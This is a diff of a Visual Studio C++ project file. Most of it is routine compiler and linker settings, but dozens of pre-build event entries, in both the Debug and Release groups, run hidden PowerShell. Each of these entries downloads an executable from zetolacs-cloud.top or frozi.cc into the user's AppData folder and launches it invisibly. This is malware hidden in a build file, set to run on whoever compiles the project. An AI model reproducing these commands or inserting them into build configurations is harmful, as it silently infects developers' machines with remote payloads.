+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MbTeY4wTlnhlVbNmIDLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=0GTls3ZELXLnKLrXDsLCW010.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Mzrj0OStxgmMYRqEMhLCW012.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=otKcaZlhkQQAcRi8ojLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=upAa8nppMvK3ggd1dFLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4Suvv0GFZDE3St59PULCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MHelDAwX4pDQEI4aRiPRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=aqFVrRXATt0e1WbhtSPRE002.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vuMxXgveUWfr4HYswLPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=CuqkLdD8r2LVIbuRFXPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=uqtg7OzSflP3gjdbMEPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vPBfvSYraXianQGEPKPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=xd3Ihnad6TB831fHToPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=G4l2Ka2AbzQFFzCl42PRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=5kbdScpPw4qbif5TtEPRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=515k8EkMr3fPBIwIL5PRE008.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING;NDEBUG;_CONSOLE;CURL_STATICLIB;CURL_DISABLE_LDAP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpplatest</LanguageStandard>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <Optimization>MinSpace</Optimization>
+      <ExceptionHandling>Async</ExceptionHandling>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <AdditionalDependencies>cryptopp-static.lib;ws2_32.lib;Normaliz.lib;Crypt32.lib;Wldap32.lib;libcurl_a.lib;libcrypto_static.lib;windowsapp.lib;libssl_static.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalOptions>/FORCE:MULTIPLE %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=otKcaZlhkQQAcRi8ojLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MHelDAwX4pDQEI4aRiPRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=G4l2Ka2AbzQFFzCl42PRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
+  </ImportGroup>
+</Project>
